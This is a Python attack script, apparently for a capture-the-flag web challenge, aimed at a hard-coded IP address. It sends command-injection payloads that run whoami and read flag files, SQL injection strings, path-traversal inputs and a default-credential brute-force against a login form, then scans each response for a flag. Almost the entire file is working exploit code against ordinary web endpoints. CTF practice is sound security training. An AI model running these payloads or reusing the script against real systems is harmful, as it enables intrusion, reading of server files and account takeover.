import requests
import re
import os

os.environ.pop('HTTP_PROXY', None)
os.environ.pop('HTTPS_PROXY', None)
requests.packages.urllib3.disable_warnings()

TARGET = "http://119.29.238.216:8088"
session = requests.Session()
session.verify = False
session.proxies = {}
session.headers.update({"User-Agent": "Mozilla/5.0"})

print("="*60)
print("深度测试Ping命令执行")
print("="*60)

# 根据提示，用户输入被拼进系统命令
# 尝试各种Windows命令执行方式

ping_payloads = [
    # Windows命令执行
    "127.0.0.1 & whoami",
    "127.0.0.1 & type F:\\flag.txt",
    "127.0.0.1 & type F:\\small peoject\\python-lab\\flag.txt",
    "127.0.0.1 & dir F:\\",
    "127.0.0.1 & dir F:\\small peoject\\python-lab",
    "127.0.0.1 && whoami",
    "127.0.0.1 && type F:\\flag.txt",
    "127.0.0.1 && type F:\\small peoject\\python-lab\\flag.txt",
    "127.0.0.1 | whoami",
    "127.0.0.1 | type F:\\flag.txt",
    "127.0.0.1 | type F:\\small peoject\\python-lab\\flag.txt",
    # 使用分号
    "127.0.0.1; whoami",
    "127.0.0.1; type F:\\flag.txt",
    "127.0.0.1; type F:\\small peoject\\python-lab\\flag.txt",
    # 不带IP
    "& whoami",
    "& type F:\\flag.txt",
    "| whoami",
    "| type F:\\flag.txt",
    "; whoami",
    "; type F:\\flag.txt",
]

for payload in ping_payloads:
    try:
        r = session.get(f"{TARGET}/ping", params={"host": payload}, timeout=10)
        if r.status_code == 200:
            body = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
            if body:
                content = body.group(1).strip()
                # 只显示有实际响应的
                if len(content) > 100 and "Blocked" not in content and "ping" not in content.lower()[:50]:
                    print(f"\n>>> {payload}")
                    print(f"响应: {content[:500]}")
                    
                    flag_match = re.search(r'flag\{[^}]+\}', content, re.IGNORECASE)
                    if flag_match:
                        print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
                        exit(0)
    except:
        pass

print("\n" + "="*60)
print("深度测试Backup")
print("="*60)

backup_payloads = [
    # 尝试读取文件
    "F:\\small peoject\\python-lab\\uploads",
    "F:\\small peoject\\python-lab\\uploads & whoami",
    "F:\\small peoject\\python-lab\\uploads & type F:\\flag.txt",
    "F:\\small peoject\\python-lab\\uploads && type F:\\flag.txt",
    "F:\\small peoject\\python-lab\\uploads | type F:\\flag.txt",
    "F:\\small peoject\\python-lab\\uploads; type F:\\flag.txt",
]

for payload in backup_payloads:
    try:
        r = session.get(f"{TARGET}/backup", params={"path": payload}, timeout=10)
        if r.status_code == 200:
            body = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
            if body:
                content = body.group(1).strip()
                if len(content) > 20 and "Blocked" not in content:
                    print(f"\n>>> {payload}")
                    print(f"响应: {content[:500]}")
                    
                    flag_match = re.search(r'flag\{[^}]+\}', content, re.IGNORECASE)
                    if flag_match:
                        print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
                        exit(0)
    except:
        pass

print("\n" + "="*60)
print("深度测试搜索SQL注入")
print("="*60)

sql_payloads = [
    "' OR 1=1--",
    "\" OR 1=1--",
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT flag,2,3 FROM flags--",
    "1' OR '1'='1",
    "admin'--",
    "' OR 1=1#",
]

for payload in sql_payloads:
    try:
        r = session.get(f"{TARGET}/search", params={"q": payload}, timeout=10)
        if r.status_code == 200:
            results = re.findall(r'<article[^>]*>.*?<h2>(.*?)</h2>.*?<p>(.*?)</p>', r.text, re.DOTALL)
            if len(results) > 3:  # 如果返回比正常多的结果
                print(f"\n>>> {payload}")
                for title, content in results:
                    print(f"  - {title.strip()}: {content.strip()}")
                
                flag_match = re.search(r'flag\{[^}]+\}', r.text, re.IGNORECASE)
                if flag_match:
                    print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
                    exit(0)
    except:
        pass

print("\n" + "="*60)
print("测试文件包含")
print("="*60)

include_payloads = [
    "welcome",
    "rules",
    "flag",
    "../flag.txt",
    "../../flag.txt",
    "....//....//flag.txt",
]

for payload in include_payloads:
    try:
        r = session.get(f"{TARGET}/include", params={"page": payload}, timeout=10)
        if r.status_code == 200:
            body = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
            if body:
                content = body.group(1).strip()
                if "Blocked" not in content and len(content) > 10:
                    print(f"\n>>> {payload}")
                    print(f"响应: {content[:300]}")
                    
                    flag_match = re.search(r'flag\{[^}]+\}', content, re.IGNORECASE)
                    if flag_match:
                        print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
                        exit(0)
    except:
        pass

print("\n" + "="*60)
print("测试登录后控制台")
print("="*60)

try:
    r = session.get(f"{TARGET}/login", timeout=10)
    csrf = re.search(r'name=["\']csrf["\']\s*value=["\']([^"\']+)["\']', r.text)
    csrf_token = csrf.group(1) if csrf else ""
    
    # 尝试更多凭据
    credentials = [
        ("admin", "admin"),
        ("admin", "123456"),
        ("admin", "password"),
        ("admin", "admin123"),
        ("admin", "root"),
        ("admin", "test"),
        ("admin", "ctf"),
        ("admin", "flag"),
        ("root", "root"),
        ("root", "admin"),
        ("test", "test"),
        ("user", "user"),
    ]
    
    for username, password in credentials:
        data = {"username": username, "password": password, "csrf": csrf_token}
        r = session.post(f"{TARGET}/login", data=data, timeout=10)
        if "用户名或密码错误" not in r.text and "登录" not in r.text[:100]:
            print(f"\n>>> 登录成功: {username}/{password}")
            
            # 检查控制台
            r2 = session.get(f"{TARGET}/dashboard", timeout=10)
            print(f"控制台内容: {r2.text[:500]}")
            
            flag_match = re.search(r'flag\{[^}]+\}', r2.text, re.IGNORECASE)
            if flag_match:
                print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
                exit(0)
except:
    pass

print("\n" + "="*60)
print("测试完成 - 未找到flag")
print("="*60)